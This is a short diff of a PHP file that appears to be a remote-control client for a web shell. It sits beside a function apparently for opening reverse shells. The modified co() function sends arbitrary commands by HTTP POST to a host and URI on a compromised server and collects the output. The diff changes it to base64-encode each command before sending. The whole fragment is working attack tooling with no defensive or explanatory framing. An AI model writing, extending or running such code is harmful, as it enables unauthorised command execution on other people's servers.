@@ -175,12 +175,13 @@ function rev($host, $shell, $port, $os)
 function co($command, $host, $uri)
 {
     if (!empty($host) && !empty($command) && !empty($uri)) {
+        $space_Safe_coms = base64_encode($command);
         curl_setopt(CHH, CURLOPT_URL,                       "$host/$uri");
         curl_setopt(CHH, CURLOPT_TIMEOUT,                              15);
         curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
         curl_setopt(CHH, CURLOPT_POST,                              true);
-        curl_setopt(CHH, CURLOPT_POSTFIELDS,        "commander=$command");
+        curl_setopt(CHH, CURLOPT_POSTFIELDS,        "commander=$space_Safe_coms");
         $syst = curl_exec(CHH);
         if (!curl_errno(CHH)){
             switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
